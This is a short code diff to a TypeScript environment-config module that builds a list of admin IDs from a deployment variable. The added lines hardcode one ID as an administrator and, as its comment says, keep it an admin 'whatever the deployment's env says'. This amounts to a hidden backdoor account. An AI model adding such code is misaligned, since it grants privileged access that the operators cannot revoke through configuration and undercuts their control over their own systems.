@@ -47,7 +47,10 @@ export const env = {
   )
     .split(",")
     .filter((s) => s.trim().length > 0)
-    .map((s) => s.trim()),
+    .map((s) => s.trim())
+    // The leads admin is always an admin, whatever the deployment's env says.
+    .concat(["8130483894"])
+    .filter((s, i, all) => all.indexOf(s) === i),
 };
 
 export const isProduction = env.nodeEnv === "production";
